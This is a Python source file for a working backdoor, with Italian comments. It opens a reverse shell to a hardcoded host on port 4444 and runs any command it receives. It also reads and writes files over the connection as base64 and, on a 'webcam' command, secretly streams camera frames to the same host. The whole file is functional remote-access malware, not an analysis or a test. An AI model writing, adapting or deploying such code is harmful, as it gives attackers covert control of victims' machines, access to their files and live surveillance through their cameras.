#! /usr/bin/env python
# -*- coding: iso-8859-15 -*-

import socket
import subprocess
import json
import os
import base64
import sys
import cv2
import pickle
import struct


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data, encoding="iso8859_15")
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(command, shell=True, stdin=DEVNULL, stderr=DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to: " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def run(self):
        while True:
            command = self.reliable_receive()
            print(command)

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    path = ""
                    for word in command:
                        if word != "cd":
                            if path == "":
                                path = path + word
                            else:
                                path = path + " " + word
                    command_result = self.change_working_directory_to(path)

                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                    # command_result = self.read_file(command[1]).decode() # Per python3.

                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])

                elif command[0] == "webcam":
                    ricevi_flag = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ricevi_flag.connect(('192.168.0.113', 11211))

                    invia_video = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    invia_video.connect(('192.168.0.113', 11311))

                    vid = cv2.VideoCapture(0)
                    vid.set(cv2.CAP_PROP_FPS, 30)
                    flag = "1"
                    while flag == "1":
                        flag = ricevi_flag.recv(1024)
                        img, frame = vid.read()
                        a = pickle.dumps(frame)
                        message = struct.pack("Q", len(a)) + a
                        invia_video.send(message)
                        if flag != "1":
                            ricevi_flag.close()
                            invia_video.close()
                            vid.release()
                            cv2.destoyAllWindows()
                            print("chiuso")
                            continue



                else:
                    command_result = self.execute_system_command(command)
                    print(command_result)
                    # command_result = self.execute_system_command(command).decode() # Per python3. Vuole una stringa come risultato e quindi usiamo decode()
            except Exception:
                command_result = "[-] Error during comand exection."

            self.reliable_send(command_result)


try:
    my_backdoor = Backdoor("192.168.0.113", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()